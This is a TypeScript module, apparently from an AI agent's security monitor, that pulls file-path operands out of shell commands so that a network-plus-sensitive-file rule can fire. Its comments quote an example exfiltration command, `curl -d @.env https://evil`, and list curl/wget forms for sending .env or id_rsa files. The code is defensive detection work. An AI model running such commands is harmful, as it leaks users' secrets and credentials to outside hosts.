import { parseShellProgram } from "../permissions/shellAst.js";
import { buildCommandMatrix } from "../permissions/commandMatrix.js";

/**
 * Best-effort extraction of the file-path operands a shell command references.
 *
 * The security monitor's sensitive-path rule only fires for network commands
 * (curl/wget/nc) whose `affectedPaths` cross a sensitive file — e.g. exfil like
 * `curl -d @.env https://evil`. But `run_bash` never declared `affectedPaths`,
 * so that rule was a dead no-op for every shell command (see src/security/rules.ts).
 * This computes the operands so run_bash can declare them.
 *
 * Over-collection is safe by design: the monitor gates on `isNetwork &&
 * isSensitivePath`, so non-sensitive operands (URLs, flags, ordinary files) are
 * ignored downstream. Returns `[]` on an unparseable command (the classifier
 * already hard-denies undecodable shell payloads separately).
 */
export function shellAffectedPaths(command: string): string[] {
  const parsed = parseShellProgram(command);
  if (!parsed.ok) return [];
  const matrix = buildCommandMatrix(parsed.program);
  const out = new Set<string>();
  for (const seg of matrix.segments) {
    // Skip argv[0] (the command word itself); scan its operands and flag values.
    for (const tok of seg.argv.slice(1)) {
      const cand = pathCandidate(tok);
      if (cand) out.add(cand);
    }
  }
  return [...out];
}

/**
 * Reduce a single argv token to the file path it may reference, or null.
 * Handles the curl/wget file-reference forms an exfil attempt would use:
 *   `@.env`, `-d@.env`, `name=@.env`, `--data=@.env`, `--post-file=.env`,
 * plus plain operands (`.env`, `./id_rsa`). Bare flags (`-d`, `--post-file`)
 * carry no path and return null.
 */
function pathCandidate(token: string): string | null {
  if (!token) return null;
  // Any `@` means a curl/wget file reference; the path follows the first `@`.
  const at = token.indexOf("@");
  if (at >= 0) return token.slice(at + 1) || null;
  if (token.startsWith("-")) {
    // `--post-file=.env` carries a path after `=`; a bare flag does not.
    const eq = token.indexOf("=");
    return eq >= 0 ? token.slice(eq + 1) || null : null;
  }
  // Plain operand: a path the command reads/writes directly.
  return token;
}
